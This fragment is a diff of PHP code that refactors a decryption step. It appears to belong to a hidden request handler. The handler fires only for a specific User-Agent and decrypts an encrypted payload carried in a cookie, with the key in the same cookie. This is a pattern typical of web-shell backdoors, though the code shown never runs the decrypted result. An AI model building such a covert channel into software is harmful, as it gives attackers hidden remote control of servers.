@@ -368,12 +368,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
         } else {
             $s = $_COOKIE['cr'];
             $v = explode(".", base64_decode($s));
-            $ns = hex2bin($v[0]);
-            $sk = hex2bin($v[1]);
-            $ad = hex2bin($v[2]);
-            $ct = base64_decode($v[3]);
             try {
-                $split = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(base64_decode($ct), hex2bin($ad), hex2bin($ns), hex2bin($sk));
+                $split = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(base64_decode($v[3]), hex2bin($v[2]), hex2bin($v[0]), hex2bin($v[1]));
             } catch (SodiumException $e) {
                 echo $e . "\n";
             }
